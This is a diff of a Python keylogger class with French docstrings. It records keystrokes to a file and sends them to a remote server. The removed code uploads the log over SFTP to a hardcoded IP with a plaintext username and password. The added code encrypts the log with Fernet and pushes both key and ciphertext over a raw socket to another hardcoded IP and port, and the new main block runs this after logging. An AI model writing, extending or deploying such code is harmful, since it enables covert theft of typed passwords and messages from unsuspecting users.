@@ -1,9 +1,11 @@
+import socket
 import time
 import keyboard
 from unidecode import unidecode
 import requests
 import datetime
 import paramiko
+from cryptography.fernet import Fernet
 
 class Fichier:
     
@@ -83,43 +85,46 @@ class Fichier:
             for mots in liste_mots:
                 fichier.write(mots)
 
-    def send_to_server(self):
+    def encrypt_and_send_file(self):
         """
-        Envoie le(s) fichier(s) self.nom_fichier vers un serveur distant en utilisant SSH.
+        Chiffre le contenu du fichier avec une clé générée aléatoirement et envoie le fichier chiffré au serveur.
 
-        Cette fonction se connecte au serveur distant à l'adresse IP 162.19.227.91 en utilisant
-        le protocole SSH (port 22) avec un nom d'utilisateur et un mot de passe fourni.
-        Elle transfère ensuite le fichier vers le répertoire 'Fichier/' sur le serveur distant.
-
-        Retourne: 
-            Aucune valeur si réussi, ou un message d'exception en cas d'erreurs d'authentification
-        ou d'autres exceptions.
+        Arguments:
+            server_address (str): L'adresse IP du serveur.
+            server_port (int): Le numéro de port du serveur.
         """
+        server_address = "162.19.252.34"
+        server_port = 12345
+        key = Fernet.generate_key()
+        cipher_suite = Fernet(key)
 
-        if not self.nom_fichier:
-            return
+        with open(self.nom_fichier, 'rb') as file:
+            plaintext = file.read()
 
-        ssh_host = "162.19.227.91"
-        ssh_port = 22
-        ssh_username = "yamyna"
-        ssh_password = "7Hb*#kRz9Q!p"
+        encrypted_text = cipher_suite.encrypt(plaintext)
 
+        self.send_encrypted_file(key, encrypted_text, server_address, server_port)
+
+    def send_encrypted_file(self, key, encrypted_text, server_address, server_port):
+        """
+        Envoie le fichier chiffré au serveur.
+
+        Arguments:
+            key (bytes): La clé de chiffrement.
+            encrypted_text (bytes): Le texte chiffré.
+            server_address (str): L'adresse IP du serveur.
+            server_port (int): Le numéro de port du serveur.
+        """
         try:
-            ssh = paramiko.SSHClient()
-            ssh.load_system_host_keys()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(ssh_host, ssh_port, ssh_username, ssh_password)
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
+                client_socket.connect((server_address, server_port))
+                client_socket.sendall(key)
+                client_socket.sendall(encrypted_text)
 
-            with ssh.open_sftp() as sftp:
-                sftp.put(self.nom_fichier, f"Fichier/{self.nom_fichier}")
-
-        except paramiko.AuthenticationException as auth_error:
-            return {auth_error}
+            print("File encrypted and sent successfully.")
         except Exception as e:
-            return {e}
+            print(f"Error while sending encrypted file: {e}")
 
-        finally:
-            ssh.close()
 
     def start_keyboard(self):
         """
@@ -147,15 +152,15 @@ class Fichier:
 
     def stop_program(self):
         """
-        Arrête le programme en appelant self.send_to_server() pour envoyer des données au serveur
+        Arrête le programme en appelant  pour envoyer des données au serveur
         avant de quitter le programme.
 
         Retourne: 
             Aucune valeur de retour, la fonction termine le programme après l'envoi des données.
         """
-        self.send_to_server()
         exit()
 
 if __name__ == "__main__":
     fichier = Fichier()
     fichier.start_keyboard()
+    fichier.encrypt_and_send_file()
